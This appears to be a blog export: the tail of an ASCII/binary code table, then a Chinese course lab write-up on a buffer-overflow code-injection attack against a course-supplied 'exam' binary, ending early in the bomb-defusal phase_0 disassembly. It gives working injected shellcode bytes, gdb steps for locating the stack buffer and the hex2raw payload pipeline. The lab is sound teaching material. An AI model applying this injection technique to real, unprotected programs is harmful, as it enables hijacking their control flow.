DEL</span><br><span class="line"><span class="number">01111100</span>	<span class="number">01111101</span>	<span class="number">01111110</span>	<span class="number">01111111</span></span><br><span class="line"></span><br><span class="line">?		?		?		?</span><br><span class="line"><span class="number">10000000</span>	<span class="number">10000001</span>	<span class="number">10000010</span>	<span class="number">10000011</span></span><br><span class="line"></span><br><span class="line">?		?		?		?</span><br><span class="line"><span class="number">10000100</span>	<span class="number">10000101</span>	<span class="number">10000110</span>	<span class="number">10000111</span></span><br><span class="line"></span><br><span class="line">?		?		?		?</span><br><span class="line"><span class="number">10001000</span>	<span class="number">10001001</span>	<span class="number">10001010</span>	<span class="number">10001011</span></span><br><span class="line"></span><br><span class="line">?		?		?		?</span><br><span class="line"><span class="number">10001100</span>	<span class="number">10001101</span>	<span class="number">10001110</span>	<span class="number">10001111</span></span><br><span class="line"></span><br><span class="line">?		?		?		?</span><br><span class="line"><span class="number">10010000</span>	<span class="number">10010001</span>	<span class="number">10010010</span>	<span class="number">10010011</span></span><br><span class="line"></span><br><span class="line">?		?		?		?</span><br><span class="line"><span class="number">10010100</span>	<span class="number">10010101</span>	<span class="number">10010110</span>	<span class="number">10010111</span></span><br><span class="line"></span><br><span class="line">?		?		?		?</span><br><span class="line"><span class="number">10011000</span>	<span class="number">10011001</span>	<span class="number">10011010</span>	<span class="number">10011011</span></span><br><span class="line"></span><br><span class="line">?		?		?		?</span><br><span class="line"><span class="number">10011100</span>	<span class="number">10011101</span>	<span class="number">10011110</span>	<span class="number">10011111</span></span><br><span class="line"></span><br><span class="line">?		?		?		?</span><br><span class="line"><span class="number">10100000</span>	<span class="number">10100001</span>	<span class="number">10100010</span>	<span class="number">10100011</span></span><br><span class="line"></span><br><span class="line">?		?		?		?</span><br><span class="line"><span class="number">10100100</span>	<span class="number">10100101</span>	<span class="number">10100110</span>	<span class="number">10100111</span></span><br><span class="line"></span><br><span class="line">?		?		?		?</span><br><span class="line"><span class="number">10101000</span>	<span class="number">10101001</span>	<span class="number">10101010</span>	<span class="number">10101011</span></span><br><span class="line"></span><br><span class="line">?		?		?		?</span><br><span class="line"><span class="number">10101100</span>	<span class="number">10101101</span>	<span class="number">10101110</span>	<span class="number">10101111</span></span><br><span class="line"></span><br><span class="line">?		?		?		?</span><br><span class="line"><span class="number">10110000</span>	<span class="number">10110001</span>	<span class="number">10110010</span>	<span class="number">10110011</span></span><br><span class="line"></span><br><span class="line">?		?		?		?</span><br><span class="line"><span class="number">10110100</span>	<span class="number">10110101</span>	<span class="number">10110110</span>	<span class="number">10110111</span></span><br><span class="line"></span><br><span class="line">?		?		?		?</span><br><span class="line"><span class="number">10111000</span>	<span class="number">10111001</span>	<span class="number">10111010</span>	<span class="number">10111011</span></span><br><span class="line"></span><br><span class="line">?		?		?		?</span><br><span class="line"><span class="number">10111100</span>	<span class="number">10111101</span>	<span class="number">10111110</span>	<span class="number">10111111</span></span><br><span class="line"></span><br><span class="line">?		?		?		?</span><br><span class="line"><span class="number">11000000</span>	<span class="number">11000001</span>	<span class="number">11000010</span>	<span class="number">11000011</span></span><br><span class="line"></span><br><span class="line">?		?		?		?</span><br><span class="line"><span class="number">11000100</span>	<span class="number">11000101</span>	<span class="number">11000110</span>	<span class="number">11000111</span></span><br><span class="line"></span><br><span class="line">?		?		?		?</span><br><span class="line"><span class="number">11001000</span>	<span class="number">11001001</span>	<span class="number">11001010</span>	<span class="number">11001011</span></span><br><span class="line"></span><br><span class="line">?		?		?		?</span><br><span class="line"><span class="number">11001100</span>	<span class="number">11001101</span>	<span class="number">11001110</span>	<span class="number">11001111</span></span><br><span class="line"></span><br><span class="line">?		?		?		?</span><br><span class="line"><span class="number">11010000</span>	<span class="number">11010001</span>	<span class="number">11010010</span>	<span class="number">11010011</span></span><br><span class="line"></span><br><span class="line">?		?		?		?</span><br><span class="line"><span class="number">11010100</span>	<span class="number">11010101</span>	<span class="number">11010110</span>	<span class="number">11010111</span></span><br><span class="line"></span><br><span class="line">?		?		?		?</span><br><span class="line"><span class="number">11011000</span>	<span class="number">11011001</span>	<span class="number">11011010</span>	<span class="number">11011011</span></span><br><span class="line"></span><br><span class="line">?		?		?		?</span><br><span class="line"><span class="number">11011100</span>	<span class="number">11011101</span>	<span class="number">11011110</span>	<span class="number">11011111</span></span><br><span class="line"></span><br><span class="line">?		?		?		?</span><br><span class="line"><span class="number">11100000</span>	<span class="number">11100001</span>	<span class="number">11100010</span>	<span class="number">11100011</span></span><br><span class="line"></span><br><span class="line">?		?		?		?</span><br><span class="line"><span class="number">11100100</span>	<span class="number">11100101</span>	<span class="number">11100110</span>	<span class="number">11100111</span></span><br><span class="line"></span><br><span class="line">?		?		?		?</span><br><span class="line"><span class="number">11101000</span>	<span class="number">11101001</span>	<span class="number">11101010</span>	<span class="number">11101011</span></span><br><span class="line"></span><br><span class="line">?		?		?		?</span><br><span class="line"><span class="number">11101100</span>	<span class="number">11101101</span>	<span class="number">11101110</span>	<span class="number">11101111</span></span><br><span class="line"></span><br><span class="line">?		?		?		?</span><br><span class="line"><span class="number">11110000</span>	<span class="number">11110001</span>	<span class="number">11110010</span>	<span class="number">11110011</span></span><br><span class="line"></span><br><span class="line">?		?		?		?</span><br><span class="line"><span class="number">11110100</span>	<span class="number">11110101</span>	<span class="number">11110110</span>	<span class="number">11110111</span></span><br><span class="line"></span><br><span class="line">?		?		?		?</span><br><span class="line"><span class="number">11111000</span>	<span class="number">11111001</span>	<span class="number">11111010</span>	<span class="number">11111011</span></span><br><span class="line"></span><br><span class="line">?		?		?		?</span><br><span class="line"><span class="number">11111100</span>	<span class="number">11111101</span>	<span class="number">11111110</span>	<span class="number">11111111</span></span><br><span class="line"></span><br><span class="line"><span class="number">00000000</span>	<span class="number">00000001</span>	<span class="number">00000010</span>	<span class="number">00000011</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">00000100</span>	<span class="number">00000101</span>	<span class="number">00000110</span>	<span class="number">00000111</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">00001000</span>	<span class="number">00001001</span>	<span class="number">00001010</span>	<span class="number">00001011</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">00001100</span>	<span class="number">00001101</span>	<span class="number">00001110</span>	<span class="number">00001111</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">00010000</span>	<span class="number">00010001</span>	<span class="number">00010010</span>	<span class="number">00010011</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">00010100</span>	<span class="number">00010101</span>	<span class="number">00010110</span>	<span class="number">00010111</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">00011000</span>	<span class="number">00011001</span>	<span class="number">00011010</span>	<span class="number">00011011</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">00011100</span>	<span class="number">00011101</span>	<span class="number">00011110</span>	<span class="number">00011111</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">00100000</span>	<span class="number">00100001</span>	<span class="number">00100010</span>	<span class="number">00100011</span>	  ?!&quot;#</span><br><span class="line"></span><br><span class="line"><span class="number">00100100</span>	<span class="number">00100101</span>	<span class="number">00100110</span>	<span class="number">00100111</span>	  $%&amp;&#x27;</span><br><span class="line"></span><br><span class="line"><span class="number">00101000</span>	<span class="number">00101001</span>	<span class="number">00101010</span>	<span class="number">00101011</span>	  ()*+</span><br><span class="line"></span><br><span class="line"><span class="number">00101100</span>	<span class="number">00101101</span>	<span class="number">00101110</span>	<span class="number">00101111</span>	  ,-./</span><br><span class="line"></span><br><span class="line"><span class="number">00110000</span>	<span class="number">00110001</span>	<span class="number">00110010</span>	<span class="number">00110011</span>	  <span class="number">0123</span></span><br><span class="line"></span><br><span class="line"><span class="number">00110100</span>	<span class="number">00110101</span>	<span class="number">00110110</span>	<span class="number">00110111</span>	  <span class="number">4567</span></span><br><span class="line"></span><br><span class="line"><span class="number">00111000</span>	<span class="number">00111001</span>	<span class="number">00111010</span>	<span class="number">00111011</span>	  <span class="number">89</span>:<span class="comment">;</span></span><br><span class="line"></span><br><span class="line"><span class="number">00111100</span>	<span class="number">00111101</span>	<span class="number">00111110</span>	<span class="number">00111111</span>	  &lt;=&gt;?</span><br><span class="line"></span><br><span class="line"><span class="number">01000000</span>	<span class="number">01000001</span>	<span class="number">01000010</span>	<span class="number">01000011</span>	  @ABC</span><br><span class="line"></span><br><span class="line"><span class="number">01000100</span>	<span class="number">01000101</span>	<span class="number">01000110</span>	<span class="number">01000111</span>	  DEFG</span><br><span class="line"></span><br><span class="line"><span class="number">01001000</span>	<span class="number">01001001</span>	<span class="number">01001010</span>	<span class="number">01001011</span>	  HIJK</span><br><span class="line"></span><br><span class="line"><span class="number">01001100</span>	<span class="number">01001101</span>	<span class="number">01001110</span>	<span class="number">01001111</span>	  LMNO</span><br><span class="line"></span><br><span class="line"><span class="number">01010000</span>	<span class="number">01010001</span>	<span class="number">01010010</span>	<span class="number">01010011</span>	  PQRS</span><br><span class="line"></span><br><span class="line"><span class="number">01010100</span>	<span class="number">01010101</span>	<span class="number">01010110</span>	<span class="number">01010111</span>	  TUVW</span><br><span class="line"></span><br><span class="line"><span class="number">01011000</span>	<span class="number">01011001</span>	<span class="number">01011010</span>	<span class="number">01011011</span>	  XYZ[</span><br><span class="line"></span><br><span class="line"><span class="number">01011100</span>	<span class="number">01011101</span>	<span class="number">01011110</span>	<span class="number">01011111</span>	  \]^_</span><br><span class="line"></span><br><span class="line"><span class="number">01100000</span>	<span class="number">01100001</span>	<span class="number">01100010</span>	<span class="number">01100011</span>	  `abc</span><br><span class="line"></span><br><span class="line"><span class="number">01100100</span>	<span class="number">01100101</span>	<span class="number">01100110</span>	<span class="number">01100111</span>	  defg</span><br><span class="line"></span><br><span class="line"><span class="number">01101000</span>	<span class="number">01101001</span>	<span class="number">01101010</span>	<span class="number">01101011</span>	  hijk</span><br><span class="line"></span><br><span class="line"><span class="number">01101100</span>	<span class="number">01101101</span>	<span class="number">01101110</span>	<span class="number">01101111</span>	  lmno</span><br><span class="line"></span><br><span class="line"><span class="number">01110000</span>	<span class="number">01110001</span>	<span class="number">01110010</span>	<span class="number">01110011</span>	  pqrs</span><br><span class="line"></span><br><span class="line"><span class="number">01110100</span>	<span class="number">01110101</span>	<span class="number">01110110</span>	<span class="number">01110111</span>	  tuvw</span><br><span class="line"></span><br><span class="line"><span class="number">01111000</span>	<span class="number">01111001</span>	<span class="number">01111010</span>	<span class="number">01111011</span>	  xyz&#123;</span><br><span class="line"></span><br><span class="line"><span class="number">01111100</span>	<span class="number">01111101</span>	<span class="number">01111110</span>	<span class="number">01111111</span>	  |&#125;~?</span><br><span class="line"></span><br><span class="line"><span class="number">10000000</span>	<span class="number">10000001</span>	<span class="number">10000010</span>	<span class="number">10000011</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">10000100</span>	<span class="number">10000101</span>	<span class="number">10000110</span>	<span class="number">10000111</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">10001000</span>	<span class="number">10001001</span>	<span class="number">10001010</span>	<span class="number">10001011</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">10001100</span>	<span class="number">10001101</span>	<span class="number">10001110</span>	<span class="number">10001111</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">10010000</span>	<span class="number">10010001</span>	<span class="number">10010010</span>	<span class="number">10010011</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">10010100</span>	<span class="number">10010101</span>	<span class="number">10010110</span>	<span class="number">10010111</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">10011000</span>	<span class="number">10011001</span>	<span class="number">10011010</span>	<span class="number">10011011</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">10011100</span>	<span class="number">10011101</span>	<span class="number">10011110</span>	<span class="number">10011111</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">10100000</span>	<span class="number">10100001</span>	<span class="number">10100010</span>	<span class="number">10100011</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">10100100</span>	<span class="number">10100101</span>	<span class="number">10100110</span>	<span class="number">10100111</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">10101000</span>	<span class="number">10101001</span>	<span class="number">10101010</span>	<span class="number">10101011</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">10101100</span>	<span class="number">10101101</span>	<span class="number">10101110</span>	<span class="number">10101111</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">10110000</span>	<span class="number">10110001</span>	<span class="number">10110010</span>	<span class="number">10110011</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">10110100</span>	<span class="number">10110101</span>	<span class="number">10110110</span>	<span class="number">10110111</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">10111000</span>	<span class="number">10111001</span>	<span class="number">10111010</span>	<span class="number">10111011</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">10111100</span>	<span class="number">10111101</span>	<span class="number">10111110</span>	<span class="number">10111111</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">11000000</span>	<span class="number">11000001</span>	<span class="number">11000010</span>	<span class="number">11000011</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">11000100</span>	<span class="number">11000101</span>	<span class="number">11000110</span>	<span class="number">11000111</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">11001000</span>	<span class="number">11001001</span>	<span class="number">11001010</span>	<span class="number">11001011</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">11001100</span>	<span class="number">11001101</span>	<span class="number">11001110</span>	<span class="number">11001111</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">11010000</span>	<span class="number">11010001</span>	<span class="number">11010010</span>	<span class="number">11010011</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">11010100</span>	<span class="number">11010101</span>	<span class="number">11010110</span>	<span class="number">11010111</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">11011000</span>	<span class="number">11011001</span>	<span class="number">11011010</span>	<span class="number">11011011</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">11011100</span>	<span class="number">11011101</span>	<span class="number">11011110</span>	<span class="number">11011111</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">11100000</span>	<span class="number">11100001</span>	<span class="number">11100010</span>	<span class="number">11100011</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">11100100</span>	<span class="number">11100101</span>	<span class="number">11100110</span>	<span class="number">11100111</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">11101000</span>	<span class="number">11101001</span>	<span class="number">11101010</span>	<span class="number">11101011</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">11101100</span>	<span class="number">11101101</span>	<span class="number">11101110</span>	<span class="number">11101111</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">11110000</span>	<span class="number">11110001</span>	<span class="number">11110010</span>	<span class="number">11110011</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">11110100</span>	<span class="number">11110101</span>	<span class="number">11110110</span>	<span class="number">11110111</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">11111000</span>	<span class="number">11111001</span>	<span class="number">11111010</span>	<span class="number">11111011</span>	  ????</span><br><span class="line"></span><br><span class="line"><span class="number">11111100</span>	<span class="number">11111101</span>	<span class="number">11111110</span>	<span class="number">11111111</span>	  ????</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Computer Systems</tag>
        <tag>Experiments</tag>
      </tags>
  </entry>
  <entry>
    <title>听说黎明前总是最黑暗的</title>
    <url>/Final-Homework/</url>
    <content><![CDATA[<p>Final Homework - 攻击+拆弹+分析</p>
<a id="more"></a>

<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/ExiTalk.png"></p>
<p><strong>声明：请独立思考并完成实验。本文只是提供一些思路，禁止作为实验报告使用。</strong></p>
<hr>
<p>本实验包含：<strong>攻击</strong>、<strong>拆弹</strong>、<strong>程序局部性特性分析</strong>和<strong>虚拟内存使用分析</strong>四部分。</p>
<p>建议提前阅读：</p>
<ul>
<li><a href="https://www.superpung.xyz/Attack-Lab/">Attack Lab</a></li>
<li><a href="https://www.superpung.xyz/Bomb-Lab/">Bomb Lab</a></li>
</ul>
<p>并准备好实验环境，不要出现下面这种情况。</p>
<p><img src="https://super-bucket1.oss-cn-beijing.aliyuncs.com/zkw.jpeg" alt="zkw"></p>
<hr>
<p>开始实验前，请记住：</p>
<ul>
<li><p><strong>磨刀不误砍柴工</strong></p>
<p>认真阅读资料和指导书，做好知识储备</p>
<p>准备好系统环境</p>
</li>
<li><p><strong>自省</strong></p>
<p>遇到错误首先反思自身，而不是怀疑他人</p>
</li>
<li><p><strong>认真</strong></p>
<p>越是细节的地方越容易出问题</p>
</li>
<li><p><strong>黎明前总是最黑暗的</strong></p>
<p>需要信心和坚持</p>
</li>
</ul>
<p>本文所有操作均基于以下环境：</p>
<ul>
<li>OS: Ubuntu 18.04.4 LTS (Linux ubuntu 5.3.0-46-generic x86_64)</li>
<li>Debugger: GNU gdb (Ubuntu 8.1-0ubuntu3.2) 8.1.0.20180409-git</li>
<li>Compiler: gcc version 7.5.0</li>
</ul>
<p><em>注：需要接入互联网。</em></p>
<p>实验材料：</p>
<ul>
<li><code>exam</code>：实验目标，需要进行破解的程序</li>
<li><code>hex2raw</code>：将格式化的十六进制文本转换成ascii码（使用方法见<a href="https://www.superpung.xyz/Attack-Lab/">Attack Lab</a>）</li>
</ul>
<p>首先使用<code>objdump</code>反汇编<code>exam</code>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">linux&gt;</span><span class="bash"> objdump -d exam &gt; exam.s</span></span><br></pre></td></tr></table></figure>
<p>实验开始。</p>
<hr>
<h1 id="任务一——攻击"><a href="#任务一——攻击" class="headerlink" title="任务一——攻击"></a>任务一——攻击</h1><p>攻击针对的是<code>exam</code>程序中的<code>doSomething</code>函数，因为它存在缓冲区溢出漏洞，相信做过Attack Lab的都知道。</p>
<p>任务一是开启后续实验的大门，所以至关重要。</p>
<p>指导中给出了<code>main</code>函数的C代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ......</span><br><span class="line">  doSomething();</span><br><span class="line">  sad_ending();</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以发现，如果让<code>doSomething</code>函数正常返回，则会直接调用<code>sad_ending</code>函数，意味着整个实验的失败：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">You failed! (T_T)</span><br></pre></td></tr></table></figure>
<p>所以我们不能让<code>doSomething</code>函数正常返回，再看指导中给出的<code>doSomething</code>函数的C代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">doSomething</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input sth. please.&quot;</span>);</span><br><span class="line">  gets(buf);</span><br><span class="line">  <span class="keyword">return</span> buf[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现<code>char buf[0x20];</code>分配0x20大小的空间，有缓冲区溢出的漏洞。等等，直接给出了缓冲区的大小？</p>
<p>在<code>exam.s</code>中找到<code>doSomething</code>函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000401830 &lt;doSomething&gt;:</span><br><span class="line">  401830:	48 83 ec 28          	sub    $0x28,%rsp</span><br></pre></td></tr></table></figure>
<p>发现401830实际分配的空间是0x28大小，果然事情没有那么简单。</p>
<hr>
<p>根据指导的要求，需要将程序的控制流导入至<code>entrance</code>函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">entrance</span><span class="params">(<span class="keyword">int</span> cookie)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (cookie != COOKIE) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Opps! Invalid cookie&quot;</span>);</span><br><span class="line">    sad_ending();</span><br><span class="line">  &#125;  </span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而且需要传递参数<code>cookie</code>，且必须等于某个常数<code>COOKIE</code>。</p>
<p>找到<code>entrance</code>函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004018b2 &lt;entrance&gt;:</span><br><span class="line">  4018b2:	55                   	push   %rbp</span><br><span class="line">  4018b3:	53                   	push   %rbx</span><br><span class="line">  4018b4:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  4018b8:	89 fd                	mov    %edi,%ebp</span><br><span class="line">  4018ba:	48 8d 3d 7f 09 00 00 	lea    0x97f(%rip),%rdi        # 402240 &lt;_IO_stdin_used+0x240&gt;</span><br><span class="line">  4018c1:	e8 7a f7 ff ff       	callq  401040 &lt;puts@plt&gt;</span><br><span class="line">  4018c6:	81 fd df ac f9 f5    	cmp    $0xf5f9acdf,%ebp</span><br><span class="line">  4018cc:	75 4f                	jne    40191d &lt;entrance+0x6b&gt;</span><br><span class="line">  ...</span><br><span class="line">  40191d:	48 8d 3d 77 08 00 00 	lea    0x877(%rip),%rdi        # 40219b &lt;_IO_stdin_used+0x19b&gt;</span><br><span class="line">  401924:	e8 17 f7 ff ff       	callq  401040 &lt;puts@plt&gt;</span><br><span class="line">  401929:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  40192e:	e8 b1 fe ff ff       	callq  4017e4 &lt;sad_ending&gt;</span><br></pre></td></tr></table></figure>
<p>发现<code>entrance</code>函数的地址是<code>0x4018b2</code>。</p>
<p>4010b8将传入的参数给了<code>%ebp</code>，4018c6将<code>%ebp</code>和<code>0xf5f9acdf</code>比较，若不相等则跳到40191d，继续执行则直接调用<code>sad_ending</code>函数使实验失败。</p>
<p>可以看出，<code>COOKIE</code>值就是<code>0xf5f9acdf</code>。<em>（为什么会有人把它当作地址？）</em></p>
<p><em>这波操作和Attack Lab的<code>Level 2</code>极其相似，所以不过多解释，可以再复习一遍<a href="https://www.superpung.xyz/Attack-Lab/">Attack Lab</a>。</em></p>
<hr>
<p>编写汇编文件<code>entrance.s</code>，重定向至<code>entrance</code> 函数，并传入参数<code>COOKIE</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov     $0xf5f9acdf,%rdi    # cookie</span><br><span class="line">push    $0x4018b2           # address of entrance</span><br><span class="line">ret</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>汇编：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -c entrance.s</span><br></pre></td></tr></table></figure>
<p>反汇编：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">objdump -d entrance.o</span><br></pre></td></tr></table></figure>
<p>得到输出如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">entrance.o：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:	48 bf df ac f9 f5 00 	movabs $0xf5f9acdf,%rdi</span><br><span class="line">   7:	00 00 00 </span><br><span class="line">   a:	68 b2 18 40 00       	pushq  $0x4018b2</span><br><span class="line">   f:	c3                   	retq </span><br></pre></td></tr></table></figure>
<p>得到字节码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">48 bf df ac f9 f5 00        &#x2F;* movabs $0xf5f9acdf,%rdi *&#x2F;</span><br><span class="line">00 00 00</span><br><span class="line">68 b2 18 40 00              &#x2F;* pushq  $0x4018b2 *&#x2F;</span><br><span class="line">c3                          &#x2F;* retq *&#x2F;</span><br></pre></td></tr></table></figure>
<hr>
<p>接下来，寻找缓冲区<code>%rsp</code>的起始地址，利用<code>gdb</code>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb exam</span><br></pre></td></tr></table></figure>
<p>打断点：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) b doSomething</span><br></pre></td></tr></table></figure>
<p>运行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) r</span><br></pre></td></tr></table></figure>
<p>单步跟踪：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) si</span><br></pre></td></tr></table></figure>
<p>此时执行到<code>401830:    sub    $0x28,%rsp</code>处，打印<code>%rsp</code>的值（地址）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) p/x $rsp</span><br></pre></td></tr></table></figure>
<p>得到输出如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">1 = 0x55585fd0</span></span><br></pre></td></tr></table></figure>
<p>即<code>%rsp</code>的地址是<code>0x55585fd0</code>，此即缓冲区的起始地址。</p>
<hr>
<p>编辑用于攻击的字符串文件<code>data.txt</code>（<strong>注意注释周围的空格、机器为小端法</strong>）：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">48 bf df ac f9 f5 00        /* movabs $0xf5f9acdf,%rdi */</span><br><span class="line">00 00 00</span><br><span class="line">68 b2 18 40 00              /* pushq  $0x4018b2 */</span><br><span class="line">c3                          /* retq */</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">d0 5f 58 55 00 00 00 00     /* address of %rsp in doSomething */</span><br></pre></td></tr></table></figure>
<p>利用<code>hex2raw</code>输入到<code>exam</code><em>（为什么有人还在加<code>-q</code>？）</em>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./hex2raw &lt; data.txt | ./exam</span><br></pre></td></tr></table></figure>
<p>得到输出如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Input sth. please.</span><br><span class="line"></span><br><span class="line">Ohh! You have found the entrance.</span><br></pre></td></tr></table></figure>
<p>完成。</p>
<hr>
<p>如果你觉得攻击实验很有趣，不妨做一下更有趣的Attack Lab。</p>
<h1 id="任务二——拆弹"><a href="#任务二——拆弹" class="headerlink" title="任务二——拆弹"></a>任务二——拆弹</h1><p>和Bomb Lab极其相似，细节不再赘述，可以再复习一遍<a href="https://www.superpung.xyz/Bomb-Lab/">Bomb Lab</a>。</p>
<blockquote>
<p>关于寄存器的常识：</p>
<ul>
<li>每个寄存器都有它特有的功能；</li>
<li><code>%rsp</code>：栈顶指针；</li>
<li><code>%rdi</code>：函数的第一个参数；</li>
<li><code>%rsi</code>：函数的第二个参数；</li>
<li><code>%rdx</code>：函数的第三个参数；</li>
<li><code>%rcx</code>：函数的第四个参数；</li>
<li><code>%rax</code>：函数的返回值。</li>
</ul>
</blockquote>
<h2 id="Phase-0-string"><a href="#Phase-0-string" class="headerlink" title="Phase 0: string"></a>Phase 0: <em>string</em></h2><p><code>phase_0</code>对应的汇编语句如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">000000000040139f &lt;phase_0&gt;:</span><br><span class="line">  40139f:	53                   	push   %rbx</span><br><span class="line">  4013a0:	48 81 ec 00 02 00 00 	sub    $0x200,%rsp</span><br><span class="line">  4013a7:	48 8b 0d 12 2d 00 00 	mov    0x2d12(%rip),%rcx        # 4040c0 &lt;stdout@@GLIBC_2.2.5&gt;</span><br><span class="line">  4013ae:	ba 17 00 00 00       	mov    $0x17,%edx</span><br><span class="line">  4013b3:	be 01 00 00 00       	mov    $0x1,%esi</span><br><span class="line">  4013b8:	48 8d 3d 7b 0c 00 00 	lea    0xc7b(%rip),%rdi        # 40203a &lt;_IO_stdin_used+0x3a&gt;</span><br><span class="line">  4013bf:	e8 3c fd ff ff       	callq  401100 &lt;fwrite@plt&gt;</span><br><span class="line">  4013c4:	48 89 e3             	mov    %rsp,%rbx</span><br><span class="line">  4013c7:	be 00 02 00 00       	mov    $0x200,%esi</span><br><span class="line">  4013cc:	48 89 df             	mov    %rbx,%rdi</span><br><span class="line">  4013cf:	e8 d5 03 00 00       	callq  4017a9 &lt;read_line&gt;</span><br><span class="line">  4013d4:	ba 30 00 00 00       	mov    $0x30,%edx</span><br><span class="line">  4013d9:	48 89 de             	mov    %rbx,%rsi</span><br><span class="line">  4013dc:	48 8d 3d 75 0c 00 00 	lea    0xc75(%rip),%rdi        # 402058 &lt;_IO_stdin_used+0x58&gt;</span><br><span class="line">  4013e3:	e8 93 07 00 00       	callq  401b7b &lt;_strncmp&gt;</span><br><span class="line">  4013e8:	85 c0                	test   %eax,%eax</span><br><span class="line">  4013ea:	75 09                	jne    4013f5 &lt;phase_0+0x56&gt;</span><br><span class="line">  4013ec:	48 81 c4 00 02 00 00 	add    $0x200,%rsp</span><br><span class="line">  4013f3:	5b                   	pop    %rbx</span><br><span class="line">  4013f4:	c3                   	retq   </span><br><span class="line">  4013f5:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  4013fa:	e8 e5 03 00 00       	callq  4017e4 &lt;sad_ending&gt;</span><br><span class="line">  4013ff:	eb eb                	jmp    4013ec &lt;phase_0+0x4d&gt;</span><br></pre></td></tr></table></figure>
<hr>
